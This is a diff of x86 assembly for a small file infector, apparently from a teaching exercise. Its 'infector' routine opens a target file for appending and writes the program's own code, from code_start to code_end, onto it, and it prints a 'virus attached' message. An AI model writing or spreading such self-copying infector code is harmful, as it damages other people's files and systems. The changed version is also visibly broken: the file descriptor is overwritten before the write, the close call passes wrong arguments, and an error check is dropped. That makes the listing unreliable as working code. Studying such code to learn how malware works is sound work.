@@ -60,21 +60,16 @@ system_call:
 code_start:
 
 infection:
-    push ebp
-    mov ebp, esp
-    pushad
     mov edx, hello_len
     mov eax, WRITE
     mov ebx, STDOUT
-    mov ecx, hello_msg
+    mov ecx, [hello_msg]
     push edx
     push ecx
     push ebx
     push eax
     call system_call
     add esp, 16
-    popad
-    pop ebp
     ret
 
 infector:
@@ -82,6 +77,7 @@ infector:
     mov ebp, esp
     sub esp, 4 
     pushad
+
     mov eax, OPEN
     mov ebx, [ebp+8]
     mov ecx, O_WRONLY | O_APPEND
@@ -92,37 +88,35 @@ infector:
     push eax
     call system_call
     add esp, 16
+
     cmp eax, 0
     jl exit_error
-    mov esi, eax 
 
     ;write the infection code to the file
     mov eax, WRITE
-    mov ebx, esi
-    mov ecx, code_start
-    mov edx, code_end
-    sub edx, code_start
+    mov ebx, eax
+    lea ecx, [code_start]
+    mov edx, code_end - code_start
     push edx
     push ecx
     push ebx
     push eax
     call system_call
     add esp, 16
-    cmp eax, 0
-    jl exit_error
+
 
     ;close the file
     mov eax, CLOSE
-    mov ebx, [ebp-4]
+    push edx
+    push ecx
     push ebx
     push eax
     call system_call
-    add esp, 8
+    add esp, 16
 
     call print_virus_attached
-
     popad
-    add esp,4
+    add esp, 4
     pop ebp
     ret
 
